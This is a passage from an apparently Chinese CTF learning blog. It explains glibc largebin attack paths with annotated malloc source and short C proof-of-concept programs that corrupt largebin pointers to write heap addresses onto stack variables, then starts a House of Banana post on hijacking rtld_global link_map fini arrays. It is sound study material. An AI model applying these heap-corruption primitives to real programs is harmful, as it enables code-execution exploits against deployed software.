victim_index);<br>victim-&gt;bk = bck;【<span class="hljs-number">8</span>】<br>victim-&gt;fd = fwd;【<span class="hljs-number">9</span>】<br>fwd-&gt;bk = victim;【<span class="hljs-number">10</span>】<br>bck-&gt;fd = victim;【<span class="hljs-number">11</span>】<br></code></pre></td></tr></table></figure><p>漏洞点主要在于【6】【7】，下面分析一下漏洞原理</p><p><strong>victim-&gt;bk_nextsize &#x3D; fwd-&gt;fd-&gt;bk_nextsize;</strong></p><p>通过修改原先最小largebin的bk_nextsize使得被链入的chunk的bk_nextsize也被篡改</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411071441038.png" alt="image-20241107144156977"></p><p><strong>fwd-&gt;fd-&gt;bk_nextsize &#x3D; victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;</strong></p><p>分开研究其中 <code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</code>把篡改的BK_NS的fd修改为victim的首地址，<code>fwd-&gt;fd-&gt;bk_nextsize= victim</code>把bck-&gt;bk_ns的值修改为victim的首地址</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411071446046.png" alt="image-20241107144630988"></p><p>【8】，【9】，【10】，【11】都是不能控制的</p><p>下面是相关代码，可以自己调试看看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-comment">// OK</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;begin test\n&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">size_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>); <span class="hljs-comment">//largebin</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//to separate</span><br><br>    <span class="hljs-type">size_t</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>); <span class="hljs-comment">//unsortedbin</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//to separate</span><br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x470</span>); <span class="hljs-comment">//Release p1 into largebin</span><br>    <span class="hljs-built_in">free</span>(p2);  <span class="hljs-comment">//Release p2 into unsortedbin</span><br><br>    p1[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> )(&amp;stack_var <span class="hljs-number">-4</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x470</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-comment">// OK</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;begin test\n&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">size_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-type">size_t</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-type">size_t</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x470</span>);<br>    <span class="hljs-built_in">free</span>(p3);<br><br>    p1[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> )(&amp;stack_var <span class="hljs-number">-4</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x470</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3）放入相同大小的-chunk"><a href="#3）放入相同大小的-chunk" class="headerlink" title="3）放入相同大小的 chunk"></a>3）放入相同大小的 chunk</h3><p>所涉及的代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">    victim_index = largebin_index (size);<br>    bck = bin_at (av, victim_index);【<span class="hljs-number">1</span>】<br>    fwd = bck-&gt;fd;【<span class="hljs-number">2</span>】<br><br>    <span class="hljs-keyword">if</span> (fwd != bck)<br>      &#123;<br>        size |= PREV_INUSE;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (bck-&gt;bk))<br>          &#123;<br>          &#125;<br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; chunksize_nomask (fwd))【<span class="hljs-number">3</span>】<br>              &#123;<br>                fwd = fwd-&gt;fd_nextsize;<br>              &#125;<br>            <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (fwd))<br>              <span class="hljs-comment">/* Always insert in the second position.  */</span><br>              fwd = fwd-&gt;fd;【<span class="hljs-number">4</span>】<br>            <span class="hljs-keyword">else</span><br>              &#123;<br>              &#125;<br>            bck = fwd-&gt;bk;【<span class="hljs-number">5</span>】<br>          &#125;<br>      &#125;<br>  &#125;<br><br>mark_bin (av, victim_index);<br>victim-&gt;bk = bck;【<span class="hljs-number">6</span>】<br>victim-&gt;fd = fwd;【<span class="hljs-number">7</span>】<br>fwd-&gt;bk = victim;【<span class="hljs-number">8</span>】<br>bck-&gt;fd = victim;【<span class="hljs-number">9</span>】<br></code></pre></td></tr></table></figure><p>漏洞点主要在【4】【5】，下面进行漏洞原理分析</p><p>如果fwd和victim大小相等，就会把fwd中的fd取出来用，从上图可以可以想到，假设存在堆溢出漏洞，那就可以修改fwd-&gt;fd， bck &#x3D; fwd-&gt;bk这条处理会把伪造的fwd的bk取出作为bck，伪造的fwd chunk的bk字段必须是要有内容的，最好是个可写内存的地址，否则执行【9】时程序会崩溃。然后fwd-&gt;bk &#x3D; victim这条处理就会在伪造的fwd-&gt;bk上写入victim的首地址。</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411071501863.png" alt="image-20241107150123801"></p><h3 id="4）放入不和其他chunk-size相等，且不是最小的chunk"><a href="#4）放入不和其他chunk-size相等，且不是最小的chunk" class="headerlink" title="4）放入不和其他chunk size相等，且不是最小的chunk"></a>4）放入不和其他chunk size相等，且不是最小的chunk</h3><p>所涉及的代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">    victim_index = largebin_index (size);<br>    bck = bin_at (av, victim_index);【<span class="hljs-number">1</span>】<br>    fwd = bck-&gt;fd;【<span class="hljs-number">2</span>】<br><br>    <span class="hljs-keyword">if</span> (fwd != bck)<br>      &#123;<br>        size |= PREV_INUSE;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (bck-&gt;bk))<br>          &#123;<br>          &#125;<br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; chunksize_nomask (fwd))【<span class="hljs-number">3</span>】<br>              &#123;<br>                fwd = fwd-&gt;fd_nextsize;<br>              &#125;<br><br>            <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (fwd))<br><br>            <span class="hljs-keyword">else</span><br>              &#123;<br>                victim-&gt;fd_nextsize = fwd;【<span class="hljs-number">4</span>】<br>                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;【<span class="hljs-number">5</span>】<br>                fwd-&gt;bk_nextsize = victim;【<span class="hljs-number">6</span>】<br>                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;【<span class="hljs-number">7</span>】<br>              &#125;<br>            bck = fwd-&gt;bk;【<span class="hljs-number">8</span>】<br>          &#125;<br>      &#125;<br>    <span class="hljs-keyword">else</span><br>  &#125;<br><br>mark_bin (av, victim_index);<br>victim-&gt;bk = bck;【<span class="hljs-number">9</span>】<br>victim-&gt;fd = fwd;【<span class="hljs-number">10</span>】<br>fwd-&gt;bk = victim;【<span class="hljs-number">11</span>】<br>bck-&gt;fd = victim;【<span class="hljs-number">12</span>】<br></code></pre></td></tr></table></figure><p>主要漏洞点在【5】【7】【8】【9】【10】【11】【12】，下面进行漏洞原理分析</p><p>初始状态如下</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411071515961.png"></p><p>执行到【7】后状态如下</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411071516440.png" alt="image-20241107151657377"></p><p>执行到最后状态如下</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411071521015.png" alt="image-20241107152134941"></p><p>修改了零个篡改地址为victim的首地址</p><p>测试代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;begin test\n&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">size_t</span> * p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x8</span>);<br><br>    <span class="hljs-type">size_t</span> * p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x8</span>);<br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x470</span>);<br>    <span class="hljs-built_in">free</span>(p2);<br><br>    p1[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> )(&amp;stack_var1 - <span class="hljs-number">2</span>);<br>    p1[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> )(&amp;stack_var2 - <span class="hljs-number">4</span>);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x470</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="高版本largebin-arrack攻击"><a href="#高版本largebin-arrack攻击" class="headerlink" title="高版本largebin arrack攻击"></a>高版本largebin arrack攻击</h2><p>关于glib2.30以后，largebin arrack攻击用下面这个分支</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                &#123;<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert (chunk_main_arena (bck-&gt;bk));<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size)<br>      &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (bck-&gt;bk))<br>                    &#123;<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      <span class="hljs-comment">//......</span><br>                  &#125;<br>                  <span class="hljs-comment">//......</span><br>              &#125;<br><br></code></pre></td></tr></table></figure><p>下面是源码，多加了两个检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c">     <span class="hljs-comment">/* place chunk in bin */</span>   <br><br>     <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>       &#123;<br>         victim_index = smallbin_index (size);<br>         bck = bin_at (av, victim_index);<br>         fwd = bck-&gt;fd;<br>       &#125;<br>     <span class="hljs-keyword">else</span><br>       &#123;<br>         victim_index = largebin_index (size);<br>         bck = bin_at (av, victim_index);<br>         fwd = bck-&gt;fd;<br><br>         <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>         <span class="hljs-keyword">if</span> (fwd != bck)<br>           &#123;<br>             <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>             size |= PREV_INUSE;<br>             <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>             assert (chunk_main_arena (bck-&gt;bk));<br>             <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size)<br>   &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (bck-&gt;bk))<br>               &#123;<br>                 fwd = bck;<br>                 bck = bck-&gt;bk;<br><br>                 victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                 victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>               &#125;<br>             <span class="hljs-keyword">else</span><br>               &#123;<br>                 assert (chunk_main_arena (fwd));<br>                 <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; chunksize_nomask (fwd))<br>                   &#123;<br>                     fwd = fwd-&gt;fd_nextsize;<br>assert (chunk_main_arena (fwd));<br>                   &#125;<br><br>                 <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size<br>== (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (fwd))<br>                   <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                   fwd = fwd-&gt;fd;<br>                 <span class="hljs-keyword">else</span><br>                   &#123;<br>                     victim-&gt;fd_nextsize = fwd;<br>                     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                     <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<br>                       malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);  <span class="hljs-comment">//多的检查</span><br>                     fwd-&gt;bk_nextsize = victim;<br>                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                   &#125;<br>                 bck = fwd-&gt;bk;<br>                 <span class="hljs-keyword">if</span> (bck-&gt;fd != fwd) <span class="hljs-comment">//多的检查</span><br>                   malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);<br>               &#125;<br>           &#125;<br>         <span class="hljs-keyword">else</span><br>           victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>       &#125;<br><br>     mark_bin (av, victim_index);<br>     victim-&gt;bk = bck;<br>     victim-&gt;fd = fwd;<br>     fwd-&gt;bk = victim;<br>     bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>House-of-Banana攻击</title>
    <link href="/2024/11/05/House-of-Banana%E6%94%BB%E5%87%BB/"/>
    <url>/2024/11/05/House-of-Banana%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="House-of-Banana"><a href="#House-of-Banana" class="headerlink" title="House of Banana"></a>House of Banana</h1><h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>上周打了国内含金量比较高的赛事强网杯，发现自己还是和高手差距很大，关于高级攻击手法积累较少，以赛代练学习一下相关知识点 — House of Banana</p><hr><h2 id="攻击手法深度解析"><a href="#攻击手法深度解析" class="headerlink" title="攻击手法深度解析"></a>攻击手法深度解析</h2><p>这种攻击手法是星盟的<a href="https://www.anquanke.com/post/id/222948#comment">ha1vk</a>师傅最开始利用的这种手法，学习两天后，才发现这种手法的奥妙，利用的条件限制也是比较少，是一种十分便捷的手法</p><p>适用场景（满足任意一个条件即可）</p><ul><li>程序能够显示的执行exit函数</li><li>程序通过libc_start_main启动的主函数，且主函数能够结束</li></ul><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>banana劫持的是rtld_global这个结构体 ，因为我们在利用exit函数退出的时候，程序会调用这个结构体。具体劫持关系如下</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">rtld_global</span> -&gt;</span> _<span class="hljs-function"><span class="hljs-title">ns_loaded</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">link_map</span> -&gt;</span> ((fini_t) array[i]) ()<br></code></pre></td></tr></table></figure><p>rtld_global结构体里面的link_map结构体，其中rtld_global中的_ns_loaded指向link_map结构体的头节点。通过劫持link_map结构体就能实现函数调用。</p><p>下面来分析一下rtld_global结构体 , rtld_global结构体组成也是非常发杂的，我们直击重点</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">rtld_global</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-comment">/* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span><br><span class="hljs-comment">     must remain the first element.  Forever.  */</span><br><br><span class="hljs-comment">/* Non-shared code has no support for multiple namespaces.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> DL_NNS 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> DL_NNS 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  EXTERN <span class="hljs-keyword">struct</span> <span class="hljs-title class_">link_namespaces</span><br>  &#123;<br>    <span class="hljs-comment">/* A pointer to the map for the main map.  */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">link_map</span> *_ns_loaded;<br>    <span class="hljs-comment">/* Number of object in the _dl_loaded list.  */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> _ns_nloaded;<br>    <span class="hljs-comment">/* Direct pointer to the searchlist of the main object.  */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">r_scope_elem</span> *_ns_main_searchlist;<br>    <span class="hljs-comment">/* This is zero at program start to signal that the global scope map is</span><br><span class="hljs-comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span><br><span class="hljs-comment">       reset if in _dl_close if the last global object is removed.  */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> _ns_global_scope_alloc;<br><br>    <span class="hljs-comment">/* During dlopen, this is the number of objects that still need to</span><br><span class="hljs-comment">       be added to the global scope map.  It has to be taken into</span><br><span class="hljs-comment">       account when resizing the map, for future map additions after</span><br><span class="hljs-comment">       recursive dlopen calls from ELF constructors.  */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> _ns_global_scope_pending_adds;<br><br>    <span class="hljs-comment">/* Once libc.so has been loaded into the namespace, this points to</span><br><span class="hljs-comment">       its link map.  */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">link_map</span> *libc_map; ##link_map结构体<br><br>    <span class="hljs-comment">/* Search table for unique objects.  */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">unique_sym_table</span><br>    &#123;<br>      __rtld_lock_define_recursive (, lock)<br>      <span class="hljs-keyword">struct</span> <span class="hljs-title class_">unique_sym</span><br>      &#123;<br>    <span class="hljs-type">uint32_t</span> hashval;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>    <span class="hljs-function"><span class="hljs-type">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Sym)</span> *sym</span>;<br>    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">link_map</span> *map;  <br>      &#125; *entries;<br>      <span class="hljs-type">size_t</span> size;<br>      <span class="hljs-type">size_t</span> n_elements;<br>      <span class="hljs-built_in">void</span> (*free) (<span class="hljs-type">void</span> *);<br>    &#125; _ns_unique_sym_table;<br>    <span class="hljs-comment">/* Keep track of changes to each namespace&#x27; list.  */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">r_debug</span> _ns_debug;<br>  &#125; _dl_ns[DL_NNS];<br>  <span class="hljs-comment">/* One higher than index of last used namespace.  */</span><br>  EXTERN <span class="hljs-type">size_t</span> _dl_nns;<br>.................................................................................<br>&#125;;<br></code></pre></td></tr></table></figure><p>而这个结构体里面存放的是elf文件各段的符号结构体_dl_ns，而这个符号结构体里面又套的有结构体，我们关注的是里面的fini_array段的动态链接结构体指针，而这个指针又会在 _dl_fini中被使用。</p><p>当调用到_dl_fini函数时，会执行每个 中注册的 fini 函数</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 